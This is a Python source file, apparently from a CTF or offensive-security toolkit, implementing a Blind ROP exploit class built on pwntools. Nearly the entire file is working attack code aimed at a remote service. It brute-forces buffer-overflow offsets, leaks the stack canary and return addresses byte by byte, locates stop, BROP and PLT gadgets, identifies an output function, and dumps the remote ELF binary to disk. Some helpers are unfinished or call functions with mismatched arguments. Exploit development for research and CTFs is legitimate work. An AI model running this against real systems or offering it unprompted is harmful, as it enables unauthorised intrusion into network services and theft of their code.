"""
Advanced BROP (Blind Return-Oriented Programming) Exploitation Module

This module provides tools to perform BROP attacks on remote services, including:
- Overflow offset discovery
- Stack canary and register leakage
- PLT and gadget discovery
- Dynamic detection of write functions (write/puts/printf)
- Full ELF binary dumping

Dependencies:
- pwntools (pwn)
- Standard Python libraries (socket, logging)

Example usage:
    >>> def custom_start(self):
    ...     self.log.info("Starting custom exploit flow")
    
    >>> brop = BROP("127.0.0.1", 4000, "Thanks", "Hello", ">>> ")
    >>> brop.lazy_binding = False

    >>> brop.start = custom_start.__get__(brop, BROP)
    >>> brop.find_overflow_offset()
    >>> brop.leak_rip()
    >>> brop.find_stop_gadget()
    >>> brop.find_brop_gadget()
    >>> brop.find_plt()
    >>> brop.find_write_function()
    >>> brop.dump_all("jumper.bin")
"""

from pwn import *
import socket
import logging


class BROP:
    """Main BROP exploitation class
    
    Attributes:
        host (str): Target hostname/IP
        port (int): Target port
        expected (bytes): Expected response marker
        expected_stop (bytes): Expected stop gadget marker
        wait (bytes): Server prompt to wait for
        write_func (str): Detected write function name
        timeout (bool): Connection timeout flag
        offset (int): Overflow buffer offset
        canary (bytes): Stack canary value
        base_addr (int): Base address of remote binary
        plt (int): Address of PLT section
        brop_gadget (int): Address of BROP gadget
        stop_gadget (int): Address of stop gadget
        elf (int): Base address of ELF header
    """
    
    def __init__(self, host, port, expected, expected_stop, wait):
        """Initialize BROP instance
        
        Args:
            host (str): Target hostname/IP address
            port (int): Target port number
            expected (str/bytes): Expected response marker for successful payloads
            expected_stop (str/bytes): Expected response marker for stop gadgets
            wait (str/bytes): Server prompt to wait for before sending payloads
        """
        self.host = host
        self.port = port
        self.expected = expected.encode() if isinstance(expected, str) else expected
        self.expected_stop = expected_stop.encode() if isinstance(expected_stop, str) else expected_stop
        self.wait = wait.encode() if isinstance(wait, str) else wait
        self.write_func = "puts"  # Default write function
        self.timeout = False
        self.current_payload = b""
        
        # BROP state initialization
        self.offset = 0
        self.canary = b""
        self.rbp = b""
        self.rip = b""
        self.base_addr = 0
        self.inf = 0
        self.plt = 0
        self.lazy_binding = True
        self.plt_entries = []
        self.brop_gadget = 0
        self.stop_gadget = 0
        self.strcmp = 0
        self.write_entry = 0
        self.fd = 0
        self.elf = 0
        self.r = None
        self.open = False
        self.max_gadget_search = 0x1000

        # Setup logging
        self.log = logging.getLogger("BROP")
        if not self.log.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
            handler.setFormatter(formatter)
            self.log.addHandler(handler)
        self.log.setLevel(logging.INFO)
        
    # --------------------------
    # Connection Management
    # --------------------------

    def start(self):
        """Optional hook of exploit entrypoint:
        You can override this method to customize the beginning of exploit flow.
        Example:
            >>> def custom_start(self):
            ...     self.log.info("Starting custom exploit flow")
            >>> brop = BROP("127.0.0.1", 4000, "Thanks", "Hello", ">>> ")

            >>> brop.start = custom_start.__get__(brop, BROP)
        """

    def connect(self):
        try:
            self.r = remote(self.host, self.port)
            self.r.settimeout(5)
            self.open = True
            self.log.info(f"Connected to {self.host}:{self.port}")
            self._start()
        except (socket.error, Exception) as e:
            self.log.error(f"Connection failed: {str(e)}")
            raise e

    def disconnect(self):
        if self.r:
            try:
                self.r.close()
            except Exception as e:
                self.log.warning(f"Error closing connection: {str(e)}")
            finally:
                self.open = False
                self.r = None

    def _reset_connection(self):
        self.disconnect()
        self.connect()


    def send_payload(self, payload: bytes, ntries: int = 1) -> bytes:
        """Send payload with retry logic
        
        Args:
            payload: Bytes to send
            ntries: Number of retry attempts
            
        Returns:
            bytes: Server response or empty bytes on failure
        """
        self.timeout = False
        for i in range(ntries):
            try:    
                if not self.r or not self.r.connected():
                    self._reset_connection()
                self.r.recvuntil(self.wait)
                self.r.send(payload)
                response = self.r.recv(timeout=2)
                return response if response else b'\x00'
            except (EOFError) as e:
                self.log.warning(f"Payload attempt n.{i} failed: {str(e)}")
                self._reset_connection()
            except (socket.timeout, TimeoutError) as e:
                self.timeout = True
                self._reset_connection()
        return b""

    def exec(self, rop: list, ntries: int = 1, timeout: bool = False, close: bool = True) -> bytes:
        """Execute ROP chain payload
        It adds the offset and concats the canary and rbp if available and the payload.

        Args:
            rop: List of ROP chain elements
            ntries: Send retry attempts
            timeout: Check for timeout condition
            close: Close connection after execution
            
        Returns:
            bytes: Server response
        """
        payload = b"A" * self.offset
        payload += self.canary
        if self.rbp:
            payload += self.rbp
        payload += b"".join(rop)
        #print(payload)
        resp = self.send_payload(payload, ntries)
        if(timeout):
            if not self.r.can_recv(timeout=1) and self.r.connected() and not self.timeout:
                print("Timeout")
                self.timeout = True
        if close:
            self.disconnect()
        self.current_payload = payload
        return resp

    # --------------------------
    # Overflow and Stack Leaking
    # --------------------------
    def find_overflow_offset(self) -> int:
        """Brute-force buffer overflow offset
        
        Returns:
            int: Discovered offset value
            
        Raises:
            Exception: If offset not found within 1000 iterations
        """
        self.connect()
        for i in range(1, 1000):
            payload = b"A" * i
            res = self.send_payload(payload, 12)
            if not res or self.expected not in res:
                self.offset = i - 1
                self.log.info(f"Discovered overflow offset: {self.offset}")
                return self.offset
        raise Exception("Overflow offset not found within limit")

    def leak_stack(self, length=8) -> bytes:
        """Leak stack data byte-by-byte
        
        Args:
            length: Number of bytes to leak
            
        Returns:
            bytes: Leaked stack data
        """
        leaked = b""
        for i in range(length):
            found = False
            for j in range(256):
                byte = j.to_bytes(1, "big")
                # Craft a payload that appends the current leaked bytes and candidate byte
                candidate = leaked + byte
                rop = [candidate]  # simple payload candidate
                res = self.exec(rop, 5)
                if res and self.expected in res:
                    leaked += byte
                    self.log.info(f"Leaked byte {i+1}: {byte.hex()}")
                    found = True
                    break
            if not found:
                raise Exception("No leak candidate found")
        return leaked

    def leak_canary(self) -> bytes:
        self.log.info("Leaking canary...")
        self.canary = self.leak_stack(8)
        self.log.info(f"Canary: {hex(u64(self.canary))}")
        return self.canary

    def leak_rbp(self) -> bytes:
        self.log.info("Leaking rbp...")
        self.rbp = self.leak_stack(8)
        self.log.info(f"rbp: {hex(u64(self.rbp))}")
        return self.rbp

    def leak_rip(self) -> int:
        self.log.info("Leaking rip...")
        rip_leak = self.leak_stack(8)
        self.rip = rip_leak
        # Derive base address by aligning leaked RIP down to page boundary.
        addr = u64(rip_leak)
        self.base_addr = addr - (addr % 0x1000)
        self.log.info(f"rip: {hex(u64(self.rip))} | base_addr: {hex(self.base_addr)}")
        return [u64(self.rip), self.base_addr]

    # --------------------------
    # Gadget and PLT Discovery
    # --------------------------
    def find_stop_gadget(self) -> int:
        """Find stop gadget
        
        Returns:
            int: Address of stop gadget
            
        Raises:
            Exception: If no stop gadget found
        """
        assert self.base_addr, "Base address must be set"
        addr = self.base_addr
        while addr < self.base_addr + self.max_gadget_search:
            rop = [p64(addr)]
            try:
                res = self.exec(rop)
                if res and self.expected_stop in res:
                    self.stop_gadget = addr
                    self.log.info(f"Found stop gadget at 0x{addr:x}")
                    return addr
            except Exception:
                pass
            addr += 0x8
        raise Exception("Stop gadget not found")

    def find_brop_gadget(self) -> int:
        """Find BROP gadget
        
        Returns:
            int: Address of BROP gadget
            
        Raises:
            Exception: If BROP gadget not found
        """
        assert self.base_addr and self.stop_gadget, "Base and stop gadget must be set"
        addr = self.base_addr
        while addr < self.base_addr + self.max_gadget_search:
            print(hex(addr))
            if self.rbp:
                rop1 = [p64(addr), self.rbp * 2, p64(0) * 4, p64(self.stop_gadget), p64(0) * 10]
            else:
                rop1 = [p64(addr), p64(0) * 6, p64(self.stop_gadget), p64(0) * 10]
            res1 = self.exec(rop1)
            rop2 = [p64(addr), p64(0) * 10]
            res2 = self.exec(rop2)
            if res1 and self.expected_stop in res1 and (not res2 or self.expected_stop not in res2):
                self.brop_gadget = addr
                self.log.info(f"Found BROP gadget at 0x{addr:x}")
                return addr
            addr += 1
        raise Exception("BROP gadget not found")

    def find_inf_gadget(self) -> int:
        """Find an infinite loop address useful only if there's no expected_stop"""
        #TODO: Implement it when there's no stop_gadget
        assert self.base_addr, "Base address must be set"

        self.log.info("Searching for infinite loop gadget...")
        addr = self.base_addr

        #addr += 0x1000

        while addr < self.base_addr + self.max_gadget_search:
            addr += 0x10
            print(hex(addr))

            rop = []
            rop.append(p64(addr))
            rop.append(p64(addr))
            rop.append(p64(0xb00bcafe))

            self.exec(rop, timeout=True)

            if not self.timeout: continue

            if not self._paranoid_inf(addr): continue

            self.inf = addr
            self.log.info(f"Found infinite loop at 0x{addr:x}")
            break
        
    def _try_plt(self, addr):
        """Check if address behaves like PLT entry"""
        try:
            rop1 = [p64(addr), p64(self.stop_gadget)]
            res1 = self.exec(rop1)
            rop2 = [p64(addr+0x6), p64(self.stop_gadget)] #works only if lazy binding is enabled
            res2 = self.exec(rop2)
            rop3 = [p64(addr), p64(0xb00bcafe)]
            res3 = self.exec(rop3)
            if self.lazy_binding: return (res1 and res2 and not res3)
            else: return (res1 and not res2 and not res3)
            

        except Exception as e:
            self.log.debug(f"Test failed for 0x{addr:x}: {str(e)}")
            return False
        
    def _paranoid_inf(self, inf):
        """Additional validation from braille logic"""
        addr = inf
        for _ in range(5):
            addr += 0x10

            if self._try_plt(addr, inf):
                self.plt = addr
                self.log.info(f"Found PLT at 0x{addr:x}")
                return True

        return False
    
    def _paranoid_plt(self, plt):
        """Additional validation from braille logic but added the check additional checks if there's no lazy binding"""
        self.log.info(f"Testing for PLT at 0x{plt:x}")
        if self.lazy_binding:
            for i in range(6):  
                rop = [
                    p64(plt + 0xb),
                    p64(i),
                    p64(self.stop_gadget),
                ]
                try:
                    res = self.exec(rop)
                    if self.expected_stop in res:
                        return True
                except:
                    return False
            return False
        else:
            for i in range(6):
                rop = [
                        p64(plt + 0xb),
                        p64(i),
                        p64(self.stop_gadget),
                    ]
                try:
                    res1 = self.exec(rop)
                    if not res1:
                        for i in range(6):
                            rop1 = [
                                p64(plt + i*0x10),
                                p64(self.stop_gadget),
                            ]
                            rop2 = [
                                p64(plt + (i*0x10)+0x6),
                                p64(self.stop_gadget),
                            ]
                            res1 = self.exec(rop1)
                            res2 = self.exec(rop2)
                            print(hex(plt + (i*0x10)+0x6))
                            print(res1)
                            print(res2)
                            if not res2 and res1 and self.expected_stop in res1:
                                return True
                except Exception as e:
                    raise e
            return False
    
    def find_plt(self) -> int:
        """Find plt address 
        N.B. IT CAN BE A WRONG ADDRESS WHEN LAZY BINDING IS DISABLED
        
        Returns:
            int: Address of plt
            
        Raises:
            Exception: If BROP gadget not found
        """
        assert self.base_addr and self.stop_gadget, "Base and stop gadget must be set"
        self.log.info("Searching for PLT address...")
        addr = self.base_addr

        while addr < self.base_addr + self.max_gadget_search:
            addr += 0x10

            if not self._try_plt(addr): continue

            if not self._paranoid_plt(addr): 
                if not self.lazy_binding: addr += 0x10*6
                continue

            self.plt = addr
            self.log.info(f"Found PLT at 0x{addr:x}")
            return self.plt

        #find_good_inf() Imma test dis when I'll have a binary that allows lazy binding
        raise Exception("PLT address not found")


    def set_plt_entry(self, rop: list, entry: int):
        """Append PLT call sequence to ROP chain.
        
        Handles both lazy binding and direct PLT addressing:
        - Lazy binding: Uses PLT+0xb for resolution stub followed by relocation offset
        - Direct call: Uses standard PLT entry spacing (0x10 per entry)

        Args:
            rop: ROP chain to modify
            entry: PLT entry index or relocation offset
        """
        assert self.plt, "PLT must be discovered first"
        if self.lazy_binding:
            rop.append(p64(self.plt + 0xb))
            rop.append(p64(entry))
        else:
            rop.append(p64(self.plt + 0x10 * entry))

    def set_plt(self, rop: list, entry: int, arg1: bytes, arg2: bytes):
        """Prepare PLT function call with two arguments.
        
        Sets up calling convention:
        - First argument (RDI) via set_rdi()
        - Second argument (RSI) via set_rsi()

        Args:
            rop: ROP chain to modify
            entry: PLT entry index
            arg1: First argument value (RDI)
            arg2: Second argument value (RSI)
        """
        self.set_rdi(rop, arg1)
        self.set_rsi(rop, arg2)
        self.set_plt_entry(rop, entry)

    def call_plt(self, entry: int, arg1: bytes, arg2: bytes, close: bool = True) -> bytes:
        """Execute PLT function call with arguments
        
        Constructs full ROP chain:
        1. Argument setup
        2. PLT call
        3. Stop gadget for execution stabilization

        Args:
            entry: PLT entry index to call
            arg1: First function argument (RDI)
            arg2: Second function argument (RSI)
            close: Close connection after execution

        Returns:
            bytes: Server response containing leaked data

        Example:
            >>> brop.call_plt(3, p64(0x400500), p64(0x8))
            b'SOME_DATA...'
        """
        rop = []
        self.set_plt(rop, entry, arg1, arg2)
        rop.append(p64(self.stop_gadget))
        return self.exec(rop, close=close)

    def set_rdi(self, rop: list, value: bytes):
        """Set RDI register using the BROP gadget
           Assumes gadget offset 0x9 gives 'pop rdi; ret'."""
        assert self.brop_gadget, "BROP gadget must be discovered first"
        rop.append(p64(self.brop_gadget + 0x9))
        rop.append(value)

    def set_rsi(self, rop: list, value: bytes):
        """Set RSI register using the BROP gadget
           Assumes gadget offset 0x7 gives 'pop rsi; pop r15; ret'."""
        assert self.brop_gadget, "BROP gadget must be discovered first"
        rop.append(p64(self.brop_gadget + 0x7))
        rop.append(value)
        rop.append(p64(0))  # dummy R15

    # --------------------------
    # Write and strcmp Discovery
    # --------------------------
    def test_write_candidate(self, entry: int, fd: int) -> bool:
        """
        Test a PLT candidate as a write function.
        It sets up a call with the candidate using fd and a dummy argument,
        then checks that the response does not contain the expected stop marker.
        """
        rop = []
        self.set_plt(rop,self.strcmp,self.rip,p64(u64(self.rip)+1))
        self.set_plt(rop,entry,p64(fd), self.rip)
        rop.append(p64(self.stop_gadget))
        try:
            res = self.exec(rop)
            if res:
                payload = self.current_payload
                res1 = res
                if payload in res:
                    res1 = res1[res1.find(payload)+len(payload):]
                else:
                    payload = payload[:payload.find(b"\x00")]
                    if payload in res: res1 = res1[res1.find(payload)+len(payload):]
                if res1 and len(res1) > 1 and self.expected_stop not in res1[:len(self.expected_stop)]:
                    self.log.info(res1)
                    self.log.info(res)
                    return True
        except Exception as e:
            raise e
        return False

    def test_printf_candidate(self, entry: int, fd: int) -> bool:
        """
        Test a PLT candidate as a printf function.
        For printf the first argument is a format string pointer.
        """
        try:
            res = self.call_plt(entry, p64(fd), self.rip)
            if res:
                payload = self.current_payload
                res1 = res
                if payload in res:
                    res1 = res1[res1.find(payload)+len(payload):]
                else:
                    payload = payload[:payload.find(b"\x00")]
                    if payload in res: res1 = res1[res1.find(payload)+len(payload):]
                if res1 and len(res1) > 1 and self.expected_stop not in res1[:len(self.expected_stop)]:
                    self.log.info(res1)
                    self.log.info(res)
                    return True
        except Exception as e:
            raise e
        return False

    def test_puts_candidate(self, entry: int) -> bool:
        """
        Test a PLT candidate as a puts function.
        For puts the argument is usually a pointer to a string.
        """
        try:
            res = self.call_plt(entry, self.rip, p64(0))
            if res:
                print(res)
                payload = self.current_payload
                res1 = res
                if payload in res:
                    res1 = res1[res1.find(payload)+len(payload):]
                else:
                    payload = payload[:payload.find(b"\x00")]
                    print(payload)
                    if payload in res: res1 = res1[res1.find(payload)+len(payload):]
                if res1 and len(res1) > 1 and self.expected_stop not in res1[:len(self.expected_stop)]:
                    self.log.info(res1)
                    self.log.info(res)
                    return True
        except Exception as e:
            raise e
        return False

    def find_write_function(self) -> None:
        """
        Dynamically identify a working write function from PLT entries.
        It tests candidates for write, printf and puts in that order.
        If a candidate is found, it updates the instance state accordingly.
        """
        """
        #TODO: Add a rop part from stop gadget if it's present
            if(not self.plt): 
            self.log.warning("No plt discovered, trying to rop into a write function")
            # Add rop part from stop gadget
        else:
        """
        if(not self.strcmp): 
            self.log.warning("No strcmp discovered, cannot search for write")
        max_fd = 50
        if not self.lazy_binding:
            for entry in range(0, -12, -1):
                print(f"Testing PLT entry {entry}")
                for fd in range(max_fd):
                    if(self.strcmp): 
                        # try the 'write' candidate
                        if self.test_write_candidate(entry, fd):
                            self.write_entry = entry
                            self.fd = fd
                            self.write_func = "write"
                            self.log.info(f"Found write function at PLT entry {entry} with fd {fd}")
                            return self.write_entry
                    # try candidate 'printf'
                    if self.test_printf_candidate(entry, fd):
                        self.write_entry = entry
                        self.fd = 0
                        self.write_func = "printf"
                        self.log.info(f"Found printf function at PLT entry {entry}")
                        return self.write_entry
                # try candidate 'puts'
                if self.test_puts_candidate(entry):
                    self.write_entry = entry
                    self.fd = 0
                    self.write_func = "puts"
                    self.log.info(f"Found puts function at PLT entry {entry}")
                    return self.write_entry
        for entry in range(300):
            print(f"Testing PLT entry {entry}")
            for fd in range(max_fd):
                if(self.strcmp): 
                    # try the 'write' candidate
                    if self.test_write_candidate(entry, fd):
                        self.write_entry = entry
                        self.fd = fd
                        self.write_func = "write"
                        self.log.info(f"Found write function at PLT entry {entry} with fd {fd}")
                        return self.write_entry
                # try candidate 'printf'
                if self.test_printf_candidate(entry, fd):
                    self.write_entry = entry
                    self.fd = 0
                    self.write_func = "printf"
                    self.log.info(f"Found printf function at PLT entry {entry}")
                    return self.write_entry
            # try candidate 'puts'
            if self.test_puts_candidate(entry):
                self.write_entry = entry
                self.fd = 0
                self.write_func = "puts"
                self.log.info(f"Found puts function at PLT entry {entry}")
                return self.write_entry
        raise Exception("Failed to find a valid write function")

    def find_strcmp(self) -> int:
        """Discover strcmp PLT entry by testing its behavior."""
        assert self.plt, "No PLT discovered"
        if not self.lazy_binding:
            for entry in range(0, -12, -1):
                res1 = self.call_plt(entry, self.rip, p64(500))
                res2 = self.call_plt(entry, p64(300), self.rip)
                res3 = self.call_plt(entry, self.rip, self.rip)
                if (not res1) and (not res2) and res3 and self.expected_stop in res3:
                    self.strcmp = entry
                    self.log.info(f"Found strcmp PLT entry at {entry}")
                    return entry
        for entry in range(300):
            # Use two calls to see if strcmp returns correctly.
            res1 = self.call_plt(entry, self.rip, p64(500))
            res2 = self.call_plt(entry, p64(300), self.rip)
            res3 = self.call_plt(entry, self.rip, self.rip)
            if (not res1) and (not res2) and res3 and self.expected_stop in res3:
                self.strcmp = entry
                self.log.info(f"Found strcmp PLT entry at {entry}")
                return entry
        raise Exception("strcmp entry not found")

    def call_write(self, arg: bytes, close: bool = False) -> bytes:
        """Call the discovered write function to leak memory."""
        if self.write_func == "write":
            rop = []
            self.set_plt(rop, self.strcmp, self.rip, p64(u64(self.rip)+1))
            self.set_plt(rop, self.write_entry, p64(self.fd), arg)
            rop.append(p64(self.stop_gadget))
            return self.exec(rop, close=close)
        elif self.write_func == "puts":
            return self.call_plt(self.write_entry, arg, p64(0), close=close)
        else:  # fallback for printf
            return self.call_plt(self.write_entry, p64(self.fd), arg, close=close)

    # --------------------------
    # ELF Dumping Functions
    # --------------------------
    def find_elf_addr(self) -> int:
        """Leak the ELF header by scanning memory backwards from the base address."""
        assert self.base_addr, "Base address must be set"
        for addr in range(self.base_addr, 0, -0x100):
            try:
                res = self.call_write(p64(addr))
                print(res)
                if res and b'ELF' in res:
                    self.elf = addr
                    self.log.info(f"Found ELF header at 0x{addr:x}")
                    return addr
            except Exception:
                continue
        raise Exception("ELF header not found")

    def dump(self, size: int) -> bytes:
        """Dump remote binary memory starting from the ELF base address."""
        #exploded = False
        if not self.elf:
            self.find_elf_addr()
        stop_addr = self.elf + size
        addr = self.elf
        leaked = b""
        while addr < stop_addr:
            res = self.call_write(p64(addr), close=True)
            if res:
                #exploded = False
                # Trim the expected_stop marker if present.
                payload = self.current_payload
                if payload in res:
                    res = res[res.find(payload)+len(payload):]
                else:
                    payload = payload[:payload.find(b"\x00")]
                    if payload in res: res = res[res.find(payload)+len(payload):]
                marker = b"\n" + self.expected_stop
                if marker in res:
                    res = res[:res.rfind(marker)]
                elif self.expected_stop in res:
                    res = res[:res.rfind(self.expected_stop)]
                leaked += res if res else b'\x00'
                addr += len(res) if res else 1
            else:
                #exploded = True
                addr += 1
        self.log.info(leaked)
        return leaked

    def get_bin_size(self) -> int:
        """Calculate ELF size based on ELF header information."""
        head = self.dump(100)
        if len(head) < 64:
            raise Exception("Incomplete ELF header")
        # e_shoff is at offset 40, e_shentsize at offset 58, e_shnum at offset 60
        e_shoff = u64(head[40:48])
        e_shentsize = unpack(head[58:60], "all")
        e_shnum = unpack(head[60:62], "all")
        size = e_shoff + (e_shentsize * e_shnum)
        self.log.info(f"Calculated ELF size: {size} bytes")
        return size

    def dump_all(self, output_file: str = "dump.bin"):
        """Dump remote binary to file
        
        Args:
            output_file: Output filename
        """
        size = self.get_bin_size()
        binary = self.dump(size)
        with open(output_file, "wb") as f:
            f.write(binary)
        self.log.info(f"Dumped binary to {output_file}")
